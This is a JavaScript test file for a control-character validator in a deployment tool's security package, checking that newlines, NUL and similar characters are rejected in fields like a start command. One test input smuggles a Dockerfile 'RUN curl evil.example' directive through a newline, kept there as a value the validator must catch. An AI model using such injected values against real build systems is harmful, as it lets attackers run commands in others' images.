import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { hasControlChars, assertNoControlChars } from '@hellodeploy/security';

describe('hasControlChars', () => {
  it('accepts ordinary text', () => {
    assert.equal(hasControlChars('npm run start'), false);
  });

  it('rejects a newline, the character that would inject a Dockerfile directive', () => {
    assert.equal(hasControlChars('npm start\nRUN curl evil.example'), true);
  });

  it('rejects a carriage return', () => {
    assert.equal(hasControlChars('value\rmore'), true);
  });

  it('rejects a NUL byte', () => {
    assert.equal(hasControlChars('value\u0000'), true);
  });

  it('rejects DEL, the top of the control range', () => {
    assert.equal(hasControlChars('value\u007f'), true);
  });

  it('accepts a space, which sits just below the control range', () => {
    assert.equal(hasControlChars('a b'), false);
  });

  it('accepts non-ASCII text rather than treating it as a control character', () => {
    assert.equal(hasControlChars('café — naïve'), false);
  });
});

describe('assertNoControlChars', () => {
  it('passes clean input through without throwing', () => {
    assert.doesNotThrow(() => assertNoControlChars('node server.js', 'Start command'));
  });

  it('throws on a control character', () => {
    assert.throws(() => assertNoControlChars('a\nb', 'Start command'));
  });

  it('names the offending field so the error is actionable', () => {
    assert.throws(
      () => assertNoControlChars('a\nb', 'Start command'),
      /Start command must not contain line breaks/,
    );
  });
});
